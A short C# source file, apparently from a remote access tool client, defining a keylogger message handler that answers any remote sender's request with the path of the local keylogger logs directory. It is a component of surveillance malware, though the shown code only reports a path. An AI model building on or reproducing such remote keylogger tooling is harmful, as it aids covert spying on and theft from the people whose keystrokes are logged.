

using InvokedClient.Config;
using InvokedCommon.Messages;
using InvokedCommon.Networking;


namespace InvokedClient.MessageHandlers
{
	public class KeyloggerHandler : IMessageProcessor
	{
		public bool CanExecute(IMessage message) => message is GetKeyloggerLogsDirectory;

		public bool CanExecuteFrom(ISender sender) => true;

		public void Execute(ISender sender, IMessage message)
		{
			if (!(message is GetKeyloggerLogsDirectory message1))
				return;
			this.Execute(sender, message1);
		}

		public void Execute(ISender client, GetKeyloggerLogsDirectory message)
		{
			client.Send<GetKeyloggerLogsDirectoryResponse>(new GetKeyloggerLogsDirectoryResponse()
			{
				LogsDirectory = Settings.LOGSPATH
			});
		}
	}
}